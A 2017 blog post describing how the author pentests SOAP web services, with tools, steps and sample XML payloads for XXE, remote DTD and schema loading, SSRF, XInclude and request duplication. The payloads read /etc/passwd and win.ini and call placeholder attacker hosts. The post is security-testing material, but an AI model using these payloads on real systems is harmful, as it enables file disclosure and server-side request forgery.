---
layout: post
title: "Too much SOAP will not clean you"
date: "2017-02-24 17:51:42 +0100"
category: blog 
link:
filename:
thumbnail:
---
To much SOAP will not clean but kill you - no seriously within the last
months I did way to many pentests of SOAP web services. It is 
nothing new and SOAP service have been around for quite some years - 
however a simple Google search will make you read a couple of blog posts 
and pressos from different conferences. Here, I would like to summarize 
what I have read and how I do pentests of web services: 


What tools do I use? There is nothing fancy in the list - just the regular
web application pentesters toolkit:

* NMAP
* Burp / ZAP
* SQLmap
* DirBuster or hand written bash/curl and python scripts
* SOAP-UI (if projects are available)
* Firefox Plugins (if no projects are available)
	* RestClient
	* SOAPClient


How do I do it? This are basically the same steps you would take for web
applications as well:

Scan the server
------------------
A regular Nmap scan will do it. This is not specific to web services but
it turned out to be useful and lead to many surprises for the developers.
If you encounter a port that should not be open - put it as an URL in your
browser and take a closer look. It surprising how many things you find
by simply opening such ports in a browser.

Scan for so far unknown end points / services
------------------------------------------------
This is a bit tricker. DirBuster may be a good help depending on the
service design, underlying technology and domain you are working in. It can
also be a complete waste of time. Unfortunately I have not found a strict
rule to stick to - so you will need to try for yourself. More often these
so far unknown end points offer development versions or feature branches
with more or less security. It always worth digging deeper, if you find
one.

Get to know the service methods and how they are related
-------------------------------------------------------
Start the SOAP UI test cases and run them through Burp or ZAP as you like.
The most important step is to follow the succession of requests closely.

- How does the authentication work?
- Is it needed / checked in every service call?
- Also study the WSDL - are all methods called within the provided test cases?
- Do the passive scans of Burp or ZAP provide you with new ideas?


Time to dig depper
------------------
Once you know how every thing is working, it is time to look for spots to 
break it. First of all take a look a classical injection attacks like:
SQLi or XSS. Normally I do a couple of fuzzing rounds with different
settings to test for these vulns:

* simply replace the real value
* replace the real value url encoded
* employ the  <![CDATA[ real value ]]> tag
* last but not least - sqlmap

Especially the last one can be very useful since its content get kind of
ignored by the xml parsers.


A classic becoming hip again - external entities:
--------------------------------------------------
XML allows you to use references which can either be abused to create an
endless loop or point to file on the servers file system. In case you
work on the later - ensure that the modified parameter is either reflected
or that you know the appropriate service method to retrieve the resolved
reference. Here is a short example:

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]>
<updateProfile>
	<firstname>Joe</firstname>
	<lastname>&file;</lastname>
	...
</updateProfile>
```

Doing it old school
-------------------
DTD are an old way of defining and injecting elements. Basically they can
be abused the same way as the external entities described above. In the 
following example loading of an additional file is presented:

```XML
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>">
<!ENTITY % remote-dtd SYSTEM "http://ip_of_your_choice/some-file.dtd">

<some_random_tag> %an-element; </some_random_tag>
<other_tag> %remote-dtd; </other_tag>
```


Extending name space definitions
--------------------------------
Name spaces help to organize data structures. However they also allow you
to specify an URL from where the definition shall be loaded. If your XML
parser is not configured to ignore these statements you can load any schema
definition you like. Keep in mind that by changing that you can include
all tags you previously defined in your schema definition. Here is a simple
example:

```XML
<roottag xmlns="http://schema/namespace/primary"
xmlns:secondaryns="http://schema/namespace/secondary"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://schema/namespace/primary
http://your_servers_ip_address/your-file1.xsd
http://schema/namespace/secondary
http://your_servers_ip_address/your-file2.xsd">

	<p>
		<secondaryns:s>
			...
		</secondaryns:s>
	</p>
</roottag>
```

SSRF - an other way to make it call home
----------------------------------------
Similar to the just described extension of name spaces you can use SSRF. 
Besides calling home to URLs of your choice you can as well try to include
files of your choice. However it hardly works with current XML parsers and 
their default configuration.

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://your_servers_ip_addess?ssrf">
<roottag>not an entity attack!</roottag>

<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "file:////etc/passwd">
<roottag/>
``` 


Include-Tags
------------
Include tags are very helpful as well - not only for the programmer, but
also for the attacker. Often you can simply extend the name space 
definitions and the XInclude. If the schema validation is not to strict
you may add any file you like to the response.

```XML
<?xml version="1.0" encoding="utf-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
	<content>Very special content that is protected by copyright.</content>
	<footer><xi:include href="http://your_ip_address/your_file.xsd"/></footer>
</document>
```


Content Duplication / Signature Wrapping
----------------------------------------
It is not strictly signature wrapping what I will describe here since
in my examples there are so signed messages or signed parts within a 
message. I was really surprised that this worked more often than expected.
This attack boils down to changing the response by simply duplicating
parts of the request and changing some values. Imagine the following:
You are testing a web service to update the customers address. Instead
of sending one block of address data you will send two. The first one
is left as it was. The second one you modify to the address you would
like to be stored. Send it and watch what happens. If schema validation
is active you will be stopped right away. If not most XML parsers simply
turn the last block of address data into the appropriate objects and
the services continues working with them.

This approach can also get applied to signed message parts. If the 
validation is sluggish there is a fair chance to get the signature 
validated against the original block and your modified unsigned block
will be processed by the web service.


So, keep it clean and use your SOAP wisely :)

Cheers!
